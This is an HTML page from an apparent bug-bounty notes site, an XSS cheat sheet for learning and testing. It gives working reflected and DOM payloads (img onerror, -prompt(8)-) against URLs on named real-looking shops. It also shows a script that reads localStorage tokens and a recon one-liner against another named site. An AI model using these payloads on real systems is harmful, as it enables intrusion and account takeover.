@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+        <title>XSS - DBugs's Bug Hunts</title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        
+        <link rel="canonical" href="https://DBugs.org/Vulnerabilities/XSS/">
+        
+
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="../../assets/css/darcula-highlight.min.css">
+
+        <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../../assets/css/dracula-ui.min.css">
+        <link rel="stylesheet" href="../../assets/css/mkdocs.min.css">
+
+        
+            <link  rel="icon" type="image/x-icon" href="../../assets/img/demnn.png">
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+                <script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+<body class="drac-bg-black-secondary drac-text-grey-ternary drac-text drac-scrollbar-purple">
+
+    <main class="d-flex">
+
+        <!-- block sidebar -->
+            <nav id="sidebar" class="sidebar drac-bg-black">
+    <div class="custom-menu">
+        <button type="button" id="sidebarCollapse" class="btn btn-primary">
+            <i class="fa fa-bars"></i>
+            <span class="sr-only">Menu</span>
+        </button>
+    </div>
+
+    <div class="p-4">
+        
+            <img class="logo" src="../../assets/img/dracula.png" height="150px">
+        
+
+        <div class="drac-text-center">
+            
+                <span class="drac-text drac-line-height drac-text-white">DBugs's Bug Hunts</span>
+            
+        </div>
+
+        <div class="drac-box flex-column">
+            <ul class="dot-ul">
+                <li><div class="dot-li drac-bg-cyan"></div></li>
+                <li><div class="dot-li drac-bg-green"></div></li>
+                <li><div class="dot-li drac-bg-orange"></div></li>
+                <li><div class="dot-li drac-bg-pink"></div></li>
+                <li><div class="dot-li drac-bg-purple"></div></li>
+                <li><div class="dot-li drac-bg-red"></div></li>
+                <li><div class="dot-li drac-bg-yellow"></div></li>
+            </ul>
+        </div>
+
+        <hr class="drac-divider" />
+
+        <!-- block menu -->
+        <ul class="mb-5 drac-list drac-list-none">
+            
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Home
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class=" active 
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#vulnerabilities-collapse" aria-expanded="false">
+                    Vulnerabilities
+                </a>
+                <div class="collapse" id="vulnerabilities-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../recon/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Recon
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../JWT_AUTHENTICATION_BYPASS/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            JWT AUTHENTICATION
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="./"
+            class=" active 
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            XSS
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../SQL%20Injection/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            SQL INJECTION
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../csrf/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CSRF
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+        </ul>
+        <!-- endblock -->
+    </div>
+</nav>
+        <!-- endblock -->
+
+        <nav class="divider drac-bg-purple-cyan"></nav>
+
+        <div class="content">
+            <!-- block header -->
+                <header>
+    <nav class="navbar navbar-expand-xl drac-bg-purple">
+        <div class="container-fluid">
+            
+            <button class="navbar-toggler w-100 text-center" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsMenu"
+                aria-controls="navbarsMenu" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse flex-column ml-auto" id="navbarsMenu">
+                <ul class="navbar-nav text-md-center">
+
+                    <!-- block preview -->
+                    <li class="nav-item">
+                            
+        <div class="container">
+            <div class="row row-preview">
+                <div class="col">
+                    <a href="../JWT_AUTHENTICATION_BYPASS/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover">
+                        <i class="fa fa-arrow-left"></i> Previous
+                    </a>
+                </div>
+                <div class="col">
+                    <a href="../SQL%20Injection/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover" style="padding-left: 3%;">
+                        Next <i class="fa fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block search -->
+                    <li class="nav-item"><div role="search" class="search-box">
+	<form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+		<input type="text" name="q" class="drac-input drac-input-search drac-input-white drac-text-white drac-bg-black-secondary"
+		placeholder="Search docs" title="Type search term here" />
+	</form>
+</div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block source -->
+                    <li class="nav-item">
+                        
+                    </li>
+                    <!--  endblock -->
+
+                </ul>
+            </div>
+
+        </div>
+    </nav>
+</header>
+            <!-- endblock -->
+
+            <!-- block content -->
+                <section class="p-md-5 section-content">
+    <article>
+        <p><h1 id="cross-site-scripting-xss-cheat-sheet">Cross-Site Scripting (XSS) Cheat Sheet</h1>
+<p>Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by others. This document covers different types of XSS and tools to detect and exploit them.</p>
+<hr />
+<h2 id="parameter-based-xss">🔍 Parameter-Based XSS</h2>
+<p>Not all XSS vulnerabilities are found via search fields — many appear in URL parameters.</p>
+<h3 id="example">Example:</h3>
+<pre><code>https://www.fenixlight.com/product/index.php?id=37%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;type=7%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
+</code></pre>
+<p>In this example, the <code>id</code> and <code>type</code> parameters are injected with a script payload.</p>
+<hr />
+<h2 id="url-path-based-xss">🧪 URL Path-Based XSS</h2>
+<p>Sometimes the vulnerability lies in the <strong>URL path</strong>, not just parameters.</p>
+<h3 id="example_1">Example:</h3>
+<pre><code>Original: https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.html  
+Tested:   https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.htmlHELLO
+</code></pre>
+<p>If <code>HELLO</code> is reflected on the frontend, it can be escalated using:</p>
+<pre><code class="language-js">-prompt(8)-
+</code></pre>
+<hr />
+<h2 id="dom-based-xss">⚙️ DOM-Based XSS</h2>
+<p>DOM-Based XSS occurs when the vulnerability is within JavaScript running in the page, not in the HTML response.</p>
+<h3 id="example_2">Example:</h3>
+<pre><code class="language-html">&lt;input type='hidden' id='utm_medium' value=''&gt;
+</code></pre>
+<p>Try modifying the URL:</p>
+<pre><code>view-source:https://example.com/?utm_medium=&lt;img src=x onerror=prompt(1)&gt;
+</code></pre>
+<p>If the frontend JavaScript reflects <code>utm_medium</code> content into the DOM unsafely, you're vulnerable.</p>
+<hr />
+<h2 id="blind-xss">🕵️ Blind XSS</h2>
+<p>With <strong>Blind XSS</strong>, the payload doesn't execute immediately. Instead, it gets triggered when viewed in an admin panel or backend dashboard.</p>
+<h3 id="steps">Steps:</h3>
+<ol>
+<li>Use platforms like <a href="https://xss.report/dashboard">https://xss.report/dashboard</a></li>
+<li>Inject payloads into input fields, headers, or metadata.</li>
+</ol>
+<h3 id="why-it-matters">Why it matters:</h3>
+<p>If the app stores sensitive data (like tokens) in localStorage/sessionStorage, you can extract it.</p>
+<pre><code class="language-html">&lt;script&gt;alert(localStorage.hjUserAttributes)&lt;/script&gt;
+</code></pre>
+<p>This leads to:
+<strong>CORS → XSS → ATO (Account Takeover)</strong></p>
+<hr />
+<h2 id="useful-commands-tools">🛠️ Useful Commands &amp; Tools</h2>
+<h3 id="terminal-one-liner">Terminal One-Liner:</h3>
+<pre><code class="language-bash">echo https://www.oshi.pk | gau | gf XSS | uro | gxss | kxss | tee out.txt
+</code></pre>
+<h3 id="tools">Tools:</h3>
+<ul>
+<li><code>python3 loxs.py</code></li>
+<li><a href="https://github.com/hahwul/dalfox"><code>dalfox</code></a> - Best auto-scanner for XSS</li>
+<li><a href="https://github.com/s0md3v/XSStrike"><code>XSStrike</code></a> - WAF bypass and intelligent payload generation</li>
+</ul>
+<hr />
+<blockquote>
+<p>⚠️ Always perform testing on sites you <strong>own</strong> or have <strong>explicit permission</strong> to test.</p>
+</blockquote>
+<hr />
+<p><strong>© 2025 Daksh Bhagwani | DBugs.org</strong></p></p>
+    </article>
+</section>
+            <!-- endblock -->
+
+            <!-- block footer -->
+                <footer>
+    <div class="d-flex flex-sm-row justify-content-between py-2 border-top drac-text-black drac-bg-cyan-green">
+        <a href="https://github.com/dracula/mkdocs" target="_blank" style="padding-left: 1%;"
+            class="footer-text drac-anchor drac-text-black drac-text-purple--hover">
+            Made with Dracula Theme for MkDocs
+        </a>
+    </div>
+</footer>
+            <!-- endblock -->
+        </div>
+
+    </main>
+
+        <script>var base_url = '../..';</script>
+        <script src="../../assets/js/jquery-3.3.1.slim.min.js"></script>
+        <script src="../../assets/js/bootstrap.bundle.min.js"></script>
+        <script src="../../assets/js/mkdocs.js"></script>
+			<script src="../../search/main.js" defer></script>
+
+</body>
+
+</html>
